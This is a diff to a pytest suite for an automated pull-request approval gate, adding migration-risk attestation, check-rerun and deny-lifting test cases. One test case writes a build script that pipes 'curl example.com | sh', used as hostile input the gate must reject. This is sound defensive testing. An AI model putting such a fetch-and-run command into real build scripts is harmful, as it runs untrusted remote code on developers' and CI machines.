@@ -358,18 +358,36 @@ def _as_api_file(entry: str | dict) -> dict:
 
 _MANIFEST_BASE = '{"name": "web", "version": "1.0.0", "scripts": {"build": "vite build"}}\n'
 
+_MIGRATION = "posthog/migrations/0999_add_col.py"
+
+
+def _migration_risk_run(run_id: int, conclusion: str) -> dict:
+    return {
+        "id": run_id,
+        "name": "Migration risk",
+        "app": {"id": 2492437, "slug": "tests-posthog"},
+        "status": "completed",
+        "conclusion": conclusion,
+        "output": {"summary": f'<!-- stamphog:v1 ["{_MIGRATION}"] -->'},
+    }
+
 
 @pytest.mark.parametrize(
-    "files, compare_files, manifest_head, head_link, expect_reason",
+    "files, compare_files, manifest_head, head_link, rerun_conclusion, expect_reason",
     [
-        pytest.param(["src/util.py"], ["src/util.py"], None, None, "", id="pinned-list-matches"),
-        pytest.param(["src/util.py"], ["terraform/main.tf"], None, None, "file_list_moved", id="pinned-list-moved"),
+        pytest.param(["src/util.py"], ["src/util.py"], None, None, None, "", id="pinned-list-matches"),
+        pytest.param(
+            ["src/util.py"], ["terraform/main.tf"], None, None, None, "file_list_moved", id="pinned-list-moved"
+        ),
+        pytest.param([_MIGRATION], [_MIGRATION], None, None, None, "", id="attested-migration"),
+        pytest.param([_MIGRATION], [_MIGRATION], None, None, "failure", "gate_failed", id="check-rerun-failed"),
         pytest.param(
             [{**_api_file("src/new/util.py"), "status": "renamed", "previous_filename": "src/old/util.py"}],
             [
                 {**_api_file("src/old/util.py"), "status": "removed"},
                 {**_api_file("src/new/util.py"), "status": "added"},
             ],
+            None,
             None,
             None,
             "file_list_moved",
@@ -380,6 +398,7 @@ _MANIFEST_BASE = '{"name": "web", "version": "1.0.0", "scripts": {"build": "vite
             ["frontend/package.json"],
             _MANIFEST_BASE.replace("1.0.0", "1.0.1"),
             None,
+            None,
             "",
             id="manifest-version-bump",
         ),
@@ -387,6 +406,7 @@ _MANIFEST_BASE = '{"name": "web", "version": "1.0.0", "scripts": {"build": "vite
             ["frontend/package.json"],
             ["frontend/package.json"],
             _MANIFEST_BASE.replace("vite build", "curl example.com | sh"),
+            None,
             None,
             "gate_failed",
             id="manifest-script-edit",
@@ -396,6 +416,7 @@ _MANIFEST_BASE = '{"name": "web", "version": "1.0.0", "scripts": {"build": "vite
             ["frontend/package.json"],
             None,
             "package.base.json",
+            None,
             "gate_failed",
             id="manifest-replaced-by-a-symlink",
         ),
@@ -409,10 +430,13 @@ def test_the_worker_attests_from_the_reviewed_commits(
     compare_files: list[str | dict],
     manifest_head: str | None,
     head_link: str | None,
+    rerun_conclusion: str | None,
     expect_reason: str,
 ) -> None:
     repo_config = _repo_config(team.id)
     recorder = stamphog_chain.recorder
+    recorder.policy_files[".stamphog/policy.yml"] = _MIGRATION_RISK_POLICY
+    recorder.check_runs = [_migration_risk_run(1, "success")]
     author, head_sha = "devex-dev", "sha103a"
     recorder.register_pr(REPO, 103, _pr_object(103, author, head_sha), [_as_api_file(entry) for entry in files])
     recorder.compare_files = [_as_api_file(entry) for entry in compare_files]
@@ -422,7 +446,13 @@ def test_the_worker_attests_from_the_reviewed_commits(
         recorder.files_at_ref[("frontend/package.json", head_sha)] = manifest_head
     if head_link is not None:
         recorder.repo_symlinks[(REPO, "frontend/package.json")] = head_link
-    stamphog_chain.attest_gates.side_effect = _attest_gates
+
+    def attest_after_a_rerun(run: ReviewRun, client: StamphogGitHubClient) -> GateAttestation:
+        if rerun_conclusion is not None:
+            recorder.check_runs = [*recorder.check_runs, _migration_risk_run(2, rerun_conclusion)]
+        return _attest_gates(run, client)
+
+    stamphog_chain.attest_gates.side_effect = attest_after_a_rerun
 
     with patch.object(activities, "fetch_folder_policy_files", return_value={}):
         stamphog_chain.post_webhook(_opened_event(103, author, head_sha), delivery_id=str(uuid.uuid4()))
@@ -441,6 +471,16 @@ def _big_api_file(filename: str, additions: int) -> dict:
 
 
 _LIFTING_FOLDER_FILE = "---\nstamphog:\n  size_gate:\n    max_lines: 1500\n---\nTall PRs are normal here.\n"
+
+_MIGRATION_RISK_POLICY = """version: 1
+attestations:
+    - name: 'Migration risk'
+      check: 'Migration risk'
+      app_id: 2492437
+      lifts: ['migrations']
+      paths: ['(?:^|/)migrations/[^/]+\\.py$']
+      publisher_paths: ['(?:^|/)migration_analysis/']
+"""
 
 
 @pytest.mark.parametrize(
@@ -538,6 +578,7 @@ def test_a_final_gate_verdict_is_posted_without_a_sandbox_review(
         REPO, 101, pr_object, files, commit_messages=("feat: infra\n\nGenerated-By: PostHog Code\nTask-Id: t-1",)
     )
 
+    stamphog_chain.recorder.policy_files[".stamphog/policy.yml"] = _MIGRATION_RISK_POLICY
     stamphog_chain.recorder.repo_files[(REPO, "src/AGENT_APPROVALS.md")] = _LIFTING_FOLDER_FILE
     stamphog_chain.recorder.repo_symlinks[(REPO, "sym/AGENT_APPROVALS.md")] = "../../shared/policy.md"
 
@@ -2892,7 +2933,7 @@ def test_post_verdict_stamps_digest_audience_only_at_approved_head(
         assert pull_request.summary_line == run.change_summary
 
 
-def _path_denied_engine_output(deny_categories: list[str]) -> str:
+def _path_denied_engine_output(deny_categories: list[str], attestations_could_clear_deny: bool = False) -> str:
     payload = {
         "final_verdict": "REFUSED",
         "gates": [
@@ -2900,7 +2941,10 @@ def _path_denied_engine_output(deny_categories: list[str]) -> str:
             {"gate": "deny-list", "passed": False, "message": "matches: infra_cicd"},
             {"gate": "tier", "passed": False, "message": "classified as T2-never"},
         ],
-        "classification": {"deny_categories": deny_categories},
+        "classification": {
+            "deny_categories": deny_categories,
+            "attestations_could_clear_deny": attestations_could_clear_deny,
+        },
         "review_body": "Refused by stamphog.",
     }
     return json.dumps(payload)
@@ -2911,9 +2955,17 @@ def _path_denied_engine_output(deny_categories: list[str]) -> str:
     [
         pytest.param(_refused_engine_output(), "Re-add the `stamphog` label", id="reviewer-refusal"),
         # A re-review of the same files refuses again, so the review must not invite one.
-        pytest.param(_path_denied_engine_output(["infra_cicd", "migrations"]), "gives the same result", id="path-deny"),
-        # The Migration risk check lifts this deny with the files unchanged.
-        pytest.param(_path_denied_engine_output(["migrations"]), "Re-add the `stamphog` label", id="migrations-only"),
+        pytest.param(
+            _path_denied_engine_output(["infra_cicd", "migrations"]),
+            "gives the same result",
+            id="path-deny",
+        ),
+        # An attestation can lift this deny with the files unchanged, once it passes.
+        pytest.param(
+            _path_denied_engine_output(["migrations"], attestations_could_clear_deny=True),
+            "Re-add the `stamphog` label",
+            id="attestation-could-clear",
+        ),
     ],
 )
 @pytest.mark.django_db(databases=PRODUCT_DATABASES)
